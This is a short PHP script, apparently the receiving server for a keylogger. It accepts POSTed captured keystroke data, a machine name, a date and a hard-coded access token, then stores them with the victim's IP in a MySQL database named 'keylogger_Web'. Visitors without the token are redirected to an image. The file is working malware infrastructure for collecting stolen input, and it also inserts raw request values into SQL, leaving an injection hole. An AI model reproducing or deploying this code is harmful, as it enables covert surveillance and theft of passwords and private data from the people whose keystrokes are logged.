<?php
//Autor:Alanprogrammer
//Datos
@$name_pc= $_POST['nombre'];
@$data = $_POST['data'];
@$fecha = $_POST['fecha'];
@$token = $_POST['token'];
@$ip = $_SERVER['REMOTE_ADDR'];
//Datos mysql
$host = "localhost";
$user = "root";
$pw = "";
$db = "keylogger_Web";
//conexion
if (isset($name_pc) &&!empty($name_pc) &&
isset($fecha) &&!empty($fecha) &&
isset($data) &&!empty($data) &&
isset($token) &&!empty($token) and $token == "f5f0634c1b1dfdca4a1f632564d06b49e5563e30b82a61fec5d55734a9853e1c"
)
{
@$con=mysql_connect($host,$user,$pw)or die ("Hubo Error");
@mysql_select_db($db,$con)or die ("Hubor error");
@mysql_query("INSERT INTO datos_recibido (ip,fecha,nombre_equipo,data) VALUES ('$ip','$fecha','$name_pc','$data')",$con);
}else{
  header("location:https://41.media.tumblr.com/tumblr_lx7agiexnM1r8a8t8o1_540.jpg");
}
/*

*/
?>
